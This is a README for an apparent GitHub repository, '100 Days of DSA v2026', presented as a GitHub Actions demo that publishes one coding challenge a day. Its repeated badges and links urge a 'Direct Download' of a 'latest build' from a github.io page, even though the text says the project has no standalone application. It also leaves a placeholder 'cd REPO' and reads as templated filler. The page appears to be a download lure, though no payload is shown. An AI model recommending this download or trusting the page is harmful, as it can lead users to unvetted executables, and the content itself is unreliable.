# 100 Days of DSA v2026 - CI/CD demo 2026

> **A coding challenge repo powered by GitHub Actions, shipping one data structures and algorithms problem, its solution, and a matching test set every day for automation practice and interview prep in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-GitHub%20Actions-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henrywardzdtn7839/100-days-dsa-v2026?style=flat-square)](https://github.com/henrywardzdtn7839/100-days-dsa-v2026)

---

<p align="center">
  <a href="https://henrywardzdtn7839.github.io/100-days-dsa-v2026/">
    <img src="https://img.shields.io/badge/Download-100%20Days%20of%20DSA%20Latest-brightgreen?style=for-the-badge" alt="Download 100 Days of DSA">
  </a>
</p>

> **[Direct Download - 100 Days of DSA v2026](https://henrywardzdtn7839.github.io/100-days-dsa-v2026/)**

---

[Download Latest Build](https://henrywardzdtn7839.github.io/100-days-dsa-v2026/)

---

## What this project is

100 Days of DSA is built as a CI/CD demo around a daily coding habit. GitHub Actions drives the release of a fresh data structures and algorithms challenge each day, together with the solution and test assets, so the repository can keep moving without manual publishing work.

It is a strong fit for developers who want to explore workflow automation while also getting a steady supply of interview-style practice material. At the same time, it acts as a hands-on reference for multi-repo orchestration, CI validation, and branch-aware merge behavior inside an automated pipeline.

---

## Highlights

- One DSA challenge delivered automatically every day
- Solution and test files generated for each challenge
- CI verification gate that runs before merge
- Automation flow that respects branch protection rules
- GitHub Actions pipeline spanning multiple repos
- Built-in interview prep material in the workflow
- Pytest support for validation
- A practical DevOps example for automation and release management

---

## Installation

Clone the repository locally or download the latest build from the project link above:

```bash
git clone https://github.com/henrywardzdtn7839/100-days-dsa-v2026.git
cd REPO
```

Once the repo is cloned, review the workflow files and open the project in the editor you prefer. If you are using the automation demo unchanged, the main entry point is the GitHub Actions workflow instead of a standalone application launcher.

---

## Usage

Common ways to work with the project include reviewing the daily challenge, inspecting the generated solution, and running the test suite locally before you push changes.

Typical steps in the workflow:

1. Open the newest DSA challenge in the repository.
2. Check the generated solution and tests.
3. Run your local verification commands.
4. Compare your own approach with the automated output.
5. Push updates and let GitHub Actions manage validation and merge behavior.

If pytest is installed in your environment, you can use it to verify the test set locally:

```bash
pytest
```

For CI-oriented experimentation, take a look at the workflow files in `.github/workflows/` and adapt the pipeline to the automation style you want.

---

## Configuration

Most of the behavior is controlled through GitHub Actions workflow files and branch configuration. In many installations, the automation rules live in the workflow definitions, while repo-level protection settings are managed on GitHub.

Example workflow-style settings:

```yaml
name: daily-dsa
on:
  schedule:
    - cron: "0 0 * * *"
  workflow_dispatch:
```

Depending on your setup, you may also need to configure:
- branch protection rules
- repository secrets for automation
- test execution commands
- scheduled workflow timing

---

## Requirements

- A GitHub account with repository access
- GitHub Actions enabled on the repository
- A compatible local environment for running tests
- Pytest for local test execution when applicable
- Git for cloning and working with changes
- Permissions sufficient to manage workflow and branch settings

---

## FAQ

**How is the daily content released?**  
By GitHub Actions workflows that automatically create and verify challenge updates on a schedule.

**Can I run the checks on my machine?**  
Yes. When the repository includes Python-based tests, they can usually be run with `pytest`.

**Where do I adjust the automation setup?**  
Check the workflow definitions under `.github/workflows/` and the repository settings for branch rules and permissions.

**What happens if a workflow breaks?**  
Review the GitHub Actions logs, resolve the root cause, then rerun the workflow or push a new commit.

**Is this only useful for DSA practice?**  
No. It also works well as a reference for CI/CD, DevOps automation, and branch-aware release flow design.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
